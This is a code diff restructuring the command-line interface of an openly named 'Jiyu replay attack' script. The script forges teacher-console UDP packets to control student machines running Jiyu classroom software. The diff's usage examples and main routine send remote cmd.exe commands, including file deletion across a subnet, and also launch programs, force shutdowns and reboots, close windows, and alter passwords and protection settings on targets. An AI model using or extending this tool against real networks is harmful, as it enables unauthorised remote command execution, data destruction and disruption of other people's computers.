@@ -55,26 +55,41 @@ def main_parser():
         prog="Jiyu_replay_attack",
         description="Jiyu Attack Script\n\n"
         "Github Repositories: https://github.com/weilycoder/Jiyu_replay_attack/tree/main/ \n",
-        epilog="Example usage:\n"
-        '    python Jiyu_replay_attack -t 192.168.106.100 -m "Hello World"\n'
-        "    python Jiyu_replay_attack -t 192.168.106.104 -w https://www.github.com\n"
-        '    python Jiyu_replay_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
-        "    python Jiyu_replay_attack -t 224.50.50.42 -e calc.exe\n"
-        "    python Jiyu_replay_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
-        '    python Jiyu_replay_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
-        '    python Jiyu_replay_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
-        "    python Jiyu_replay_attack -t 192.168.106.255 -cw\n"
-        "    python Jiyu_replay_attack -t 192.168.106.100 -ctw\n"
-        "    python Jiyu_replay_attack -t 192.168.106.100 -n hacker 1000\n"
-        "    python Jiyu_replay_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
-        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
-        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
-        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
-        "    python Jiyu_replay_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
-        "    python Jiyu_replay_attack -t 127.0.0.1 --setting",
         formatter_class=MaxWidthHelpFormatter,
     )
-    network_config_group = parser.add_argument_group(
+
+    subcommand = parser.add_subparsers(
+        dest="subcommand",
+        title="Commands",
+        description="Available commands",
+        metavar="<command>",
+        help="Use 'Jiyu_replay_attack <command> -h' for more information on a specific command.",
+        required=True,
+    )
+
+    attack_cmd = subcommand.add_parser(
+        "attack",
+        help="Perform a Jiyu attack by sending crafted UDP packets to the target machine.",
+        epilog="Example usage:\n"
+        '    python Jiyu_replay_attack attack -t 192.168.106.100 -m "Hello World"\n'
+        "    python Jiyu_replay_attack attack -t 192.168.106.104 -w https://www.github.com\n"
+        '    python Jiyu_replay_attack attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
+        "    python Jiyu_replay_attack attack -t 224.50.50.42 -e calc.exe\n"
+        "    python Jiyu_replay_attack attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
+        '    python Jiyu_replay_attack attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
+        '    python Jiyu_replay_attack attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
+        "    python Jiyu_replay_attack attack -t 192.168.106.255 -cw\n"
+        "    python Jiyu_replay_attack attack -t 192.168.106.100 -ctw\n"
+        "    python Jiyu_replay_attack attack -t 192.168.106.100 -n hacker 1000\n"
+        "    python Jiyu_replay_attack attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
+        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
+        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
+        '    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
+        "    python Jiyu_replay_attack attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
+        "    python Jiyu_replay_attack attack -t 127.0.0.1 --setting",
+        formatter_class=MaxWidthHelpFormatter,
+    )
+    network_config_group = attack_cmd.add_argument_group(
         "Network Configuration", "Specify the network configuration for the attack."
     )
     network_config_group.add_argument(
@@ -118,7 +133,7 @@ def main_parser():
         help="IP ID for the packet (default: random ID)",
     )
 
-    attack_action_group = parser.add_argument_group(
+    attack_action_group = attack_cmd.add_argument_group(
         "Attack Action", "Specify the action to perform on the target machine. "
     )
     attack_action = attack_action_group.add_mutually_exclusive_group()
@@ -210,23 +225,25 @@ def main_parser():
         help="Custom packet data to send",
     )
 
-    detect_group = parser.add_argument_group(
-        "Local Detection",
-        "Detect local UDP listeners and print results.",
+    detect_cmd = subcommand.add_parser(
+        "detect",
+        help="Detect local UDP listeners and print results.",
+        formatter_class=MaxWidthHelpFormatter,
     )
-    detect_group.add_argument(
-        "--detect-udp",
+    detect_cmd.add_argument(
+        "keywords",
         nargs="*",
         metavar="<keyword>",
-        default=None,
-        help="Detect local UDP listeners and exit",
+        default="studentmain",
+        help="Keywords to search for in UDP listeners (default: 'studentmain')",
     )
-    detect_group.add_argument(
+    detect_cmd.add_argument(
         "--detect-format",
         type=str,
         metavar="<format>",
         default=None,
-        help="Python format output. Default for one-line port list.",
+        help="Python format output. Default for one-line port list.\n"
+        "Use {ip}, {port}, {pid}, {name} for IP address, port, PID and process name respectively.",
     )
     return parser
 
@@ -238,12 +255,12 @@ def setting_parser():
     """
     parser = argparse.ArgumentParser(
         description="Specify settings for the target machine",
-        usage='Jiyu_replay_attack <main-args> --setting="[setting-options]"',
+        usage='Jiyu_replay_attack attack <main-args> --setting="[setting-options]"',
         argument_default=argparse.SUPPRESS,
         epilog="Example usage:\n"
-        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting=""\n'
-        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
-        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
+        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting=""\n'
+        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
+        '    python Jiyu_replay_attack attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
         formatter_class=MaxWidthHelpFormatter,
     )
     network = parser.add_argument_group("Network Configuration")
@@ -346,117 +363,120 @@ def setting_parser():
 
 def main():
     """Main function to parse arguments and execute the attack."""
-    logger: List[Any] = []
-
     parser = main_parser()
     args = parser.parse_args()
-    teacher_ip = args.teacher_ip
-    teacher_port = args.teacher_port
-    targets = args.target
-    port = args.target_port
-
-    logger.append(args)
 
     try:
-        if args.detect_udp is not None:
-            keywords = args.detect_udp if len(args.detect_udp) > 0 else ["studentmain"]
+        if args.subcommand == "detect":
             if args.detect_format is None:
-                ports = candidate_udp_ports(keywords)
+                ports = candidate_udp_ports(args.keywords)
                 print(" ".join(str(port) for port in ports))
             else:
-                for ip, port, pid, name in list_udp_listeners(keywords):
+                for ip, port, pid, name in list_udp_listeners(args.keywords):
                     print(args.detect_format.format(ip=ip, port=port, pid=pid, name=ascii(name)))
             return
-        if args.message:
-            payload = pkg_message(args.message)
-        elif args.website:
-            payload = pkg_website(args.website)
-        elif args.command:
-            payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
-        elif args.close_top_window:
-            payload = pkg_close_top_window()
-        elif args.execute:
-            if len(args.execute) != 2:
-                parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
-            else:
-                mode, args_list = args.execute
-                args_list = cast(Sequence[str], args_list)
-                if len(args_list) == 1:
-                    program, args_list = args_list[0], ""
-                elif len(args_list) == 2:
-                    program, args_list = args_list
-                else:
+        elif args.subcommand == "attack":
+            logger: List[Any] = []
+
+            teacher_ip = args.teacher_ip
+            teacher_port = args.teacher_port
+            targets = args.target
+            port = args.target_port
+
+            logger.append(args)
+
+            if args.message:
+                payload = pkg_message(args.message)
+            elif args.website:
+                payload = pkg_website(args.website)
+            elif args.command:
+                payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
+            elif args.close_top_window:
+                payload = pkg_close_top_window()
+            elif args.execute:
+                if len(args.execute) != 2:
                     parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
-            payload = pkg_execute(
-                program,
-                args_list,
-                "normal" if mode is None else mode,  # pylint: disable=E0601, E0606
-            )
-        elif args.shutdown is not None:
-            if len(args.shutdown) == 0:
-                payload = pkg_shutdown()
-            elif len(args.shutdown) == 1:
-                payload = pkg_shutdown(timeout=int(args.shutdown[0]))
-            elif len(args.shutdown) == 2:
-                payload = pkg_shutdown(timeout=int(args.shutdown[0]), message=args.shutdown[1])
+                else:
+                    mode, args_list = args.execute
+                    args_list = cast(Sequence[str], args_list)
+                    if len(args_list) == 1:
+                        program, args_list = args_list[0], ""
+                    elif len(args_list) == 2:
+                        program, args_list = args_list
+                    else:
+                        parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
+                payload = pkg_execute(
+                    program,
+                    args_list,
+                    "normal" if mode is None else mode,  # pylint: disable=E0601, E0606
+                )
+            elif args.shutdown is not None:
+                if len(args.shutdown) == 0:
+                    payload = pkg_shutdown()
+                elif len(args.shutdown) == 1:
+                    payload = pkg_shutdown(timeout=int(args.shutdown[0]))
+                elif len(args.shutdown) == 2:
+                    payload = pkg_shutdown(timeout=int(args.shutdown[0]), message=args.shutdown[1])
+                else:
+                    parser.error("Invalid shutdown arguments: expected [timeout] or [timeout, message]")
+            elif args.reboot is not None:
+                if len(args.reboot) == 0:
+                    payload = pkg_shutdown(reboot=True)
+                elif len(args.reboot) == 1:
+                    payload = pkg_shutdown(timeout=int(args.reboot[0]), reboot=True)
+                elif len(args.reboot) == 2:
+                    payload = pkg_shutdown(timeout=int(args.reboot[0]), message=args.reboot[1], reboot=True)
+                else:
+                    parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
+            elif args.close_windows is not None:
+                if len(args.close_windows) == 0:
+                    payload = pkg_close_windows()
+                elif len(args.close_windows) == 1:
+                    payload = pkg_close_windows(timeout=int(args.close_windows[0]))
+                elif len(args.close_windows) == 2:
+                    payload = pkg_close_windows(timeout=int(args.close_windows[0]), message=args.close_windows[1])
+                else:
+                    parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
+            elif args.rename:
+                name, name_id = args.rename
+                payload = pkg_rename(name, int(name_id))
+            elif args.setting is not None:
+                parser2 = setting_parser()
+                setting_args = parser2.parse_args(shlex.split(args.setting))
+                payload = pkg_setting(**dict(setting_args._get_kwargs()))  # pylint: disable=protected-access
+                logger.append(setting_args)  # Store parsed settings for debugging
+            elif args.hex:
+                payload = binascii.unhexlify(args.hex.replace(" ", ""))
+            elif args.pkg:
+                format_str, *user_args = args.pkg
+                if not format_str.startswith(":"):
+                    with open(format_str, "r", encoding="utf-8") as f:
+                        format_str = f.read().strip()
+                else:
+                    format_str = format_str[1:]  # Remove leading ':'
+                payload = pkg_customize(format_str, *user_args)
             else:
-                parser.error("Invalid shutdown arguments: expected [timeout] or [timeout, message]")
-        elif args.reboot is not None:
-            if len(args.reboot) == 0:
-                payload = pkg_shutdown(reboot=True)
-            elif len(args.reboot) == 1:
-                payload = pkg_shutdown(timeout=int(args.reboot[0]), reboot=True)
-            elif len(args.reboot) == 2:
-                payload = pkg_shutdown(timeout=int(args.reboot[0]), message=args.reboot[1], reboot=True)
-            else:
-                parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
-        elif args.close_windows is not None:
-            if len(args.close_windows) == 0:
-                payload = pkg_close_windows()
-            elif len(args.close_windows) == 1:
-                payload = pkg_close_windows(timeout=int(args.close_windows[0]))
-            elif len(args.close_windows) == 2:
-                payload = pkg_close_windows(timeout=int(args.close_windows[0]), message=args.close_windows[1])
-            else:
-                parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
-        elif args.rename:
-            name, name_id = args.rename
-            payload = pkg_rename(name, int(name_id))
-        elif args.setting is not None:
-            parser2 = setting_parser()
-            setting_args = parser2.parse_args(shlex.split(args.setting))
-            payload = pkg_setting(**dict(setting_args._get_kwargs()))  # pylint: disable=protected-access
-            logger.append(setting_args)  # Store parsed settings for debugging
-        elif args.hex:
-            payload = binascii.unhexlify(args.hex.replace(" ", ""))
-        elif args.pkg:
-            format_str, *user_args = args.pkg
-            if not format_str.startswith(":"):
-                with open(format_str, "r", encoding="utf-8") as f:
-                    format_str = f.read().strip()
-            else:
-                format_str = format_str[1:]  # Remove leading ':'
-            payload = pkg_customize(format_str, *user_args)
+                parser.error("At least one attack action must be specified. Use -h for help.")
+
+            if targets is None:
+                parser.error("Target IP address must be specified. Use -h for help.")
+            if len(targets) == 0:
+                parser.error("Target IP address cannot be empty. Use -h for help.")
+
+            print(*logger, sep="\n\n", end="\n\n")
+
+            for target in targets:
+                for dest in broadcast_packet(
+                    teacher_ip,
+                    teacher_port,
+                    target,
+                    port,
+                    payload,
+                    ip_id=args.ip_id,  # pylint: disable=E0601, E0606
+                ):
+                    print(f"Sent packet with a length of {len(payload)} to {dest[0]}:{dest[1]}")
         else:
-            parser.error("At least one attack action must be specified. Use -h for help.")
-
-        if targets is None:
-            parser.error("Target IP address must be specified. Use -h for help.")
-        if len(targets) == 0:
-            parser.error("Target IP address cannot be empty. Use -h for help.")
-
-        print(*logger, sep="\n\n", end="\n\n")
-
-        for target in targets:
-            for dest in broadcast_packet(
-                teacher_ip,
-                teacher_port,
-                target,
-                port,
-                payload,
-                ip_id=args.ip_id,  # pylint: disable=E0601, E0606
-            ):
-                print(f"Sent packet with a length of {len(payload)} to {dest[0]}:{dest[1]}")
+            parser.error("Invalid command. Use -h for help.")
     except Exception as e:  # pylint: disable=broad-except
         parser.error(f"({e.__class__.__name__}) {e}")
 
